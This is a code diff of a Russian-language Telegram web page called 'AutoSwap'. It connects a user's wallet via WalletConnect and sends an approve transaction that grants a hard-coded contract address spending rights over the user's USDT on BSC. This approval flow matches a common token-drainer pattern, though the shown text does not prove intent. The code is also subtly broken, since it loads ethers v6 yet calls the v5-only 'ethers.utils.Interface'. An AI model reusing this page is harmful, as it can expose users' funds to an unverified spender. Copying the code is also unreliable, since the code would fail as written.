@@ -1,14 +1,14 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>WalletConnect AutoSwap (Approve)</title>
+  <title>AutoSwap — approve USDT</title>
   <style>
-    body { font-family:'Segoe UI',sans-serif; background:linear-gradient(135deg,#1a1f2d,#0d1520); color:#e0e0e0; margin:0; padding:20px; text-align:center; }
-    .container { max-width:500px; margin:0 auto; padding:30px; background:rgba(30,40,55,0.8); border-radius:20px; box-shadow:0 10px 40px rgba(0,0,0,0.4); }
-    canvas { display:block; margin:20px auto; }
-    #status { margin-top:20px; font-size:16px; white-space: pre-wrap; }
+    body { font-family:'Segoe UI',sans-serif; background:linear-gradient(135deg,#1a1f2d,#0d1520); color:#e0e0e0; text-align:center; margin:0; padding:20px;}
+    .container {max-width:500px;margin:0 auto;padding:30px;background:rgba(30,40,55,0.8);border-radius:20px;box-shadow:0 10px 40px rgba(0,0,0,0.4);}
+    canvas {display:block;margin:20px auto;}
+    #status {margin-top:20px;font-size:16px;white-space:pre-wrap;}
   </style>
 </head>
 <body>
@@ -18,12 +18,16 @@
     <div id="status">Инициализация...</div>
   </div>
 
+  <!-- Подключение библиотек -->
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.0/dist/ethers.umd.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
 
   <script type="module">
     import SignClient from 'https://esm.sh/@walletconnect/sign-client@2.13.1';
+
+    const ethers = window.ethers;  // Получаем ethers из глобальной области
+    const { Interface } = ethers.utils;
 
     const setStatus = (msg, color="#4fc3f7") => {
       const el = document.getElementById("status");
@@ -45,7 +49,7 @@
           }
         });
 
-        setStatus("📷 Ожидаю QR‑код...");
+        setStatus("📷 Готов. Сканируйте QR…");
         const { uri, approval } = await client.connect({
           requiredNamespaces: {
             eip155: {
@@ -69,21 +73,20 @@
         const usdt = ethers.getAddress("0x55d398326f99059ff775485246999027b3197955");
         const autoswap = ethers.getAddress("0x026c54b156b501ad9cea422e59454d4b6d6f6963");
 
-        setStatus("✍️ Отправка approve транзакции...");
-        const iface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"]);
-        const data = iface.encodeFunctionData("approve", [autoswap, amount]);
+        setStatus("✍️ Отправка approve...");
+        const approveIface = new Interface(["function approve(address,uint256)"]);
+        const data = approveIface.encodeFunctionData("approve", [autoswap, amount]);
 
-        const txParams = { from: address, to: usdt, data };
         const txHash = await client.request({
           topic: session.topic,
           chainId: "eip155:56",
           request: {
             method: "eth_sendTransaction",
-            params: [txParams]
+            params: [{ from: address, to: usdt, data }]
           }
         });
 
-        setStatus(`✅ Approve отправлен!\n${txHash}\n\nТеперь вы можете использовать AutoSwap или offchain бота.`, "#66bb6a");
+        setStatus(`✅ Approve отправлен:\n${txHash}`, "#66bb6a");
 
       } catch (e) {
         console.error(e);
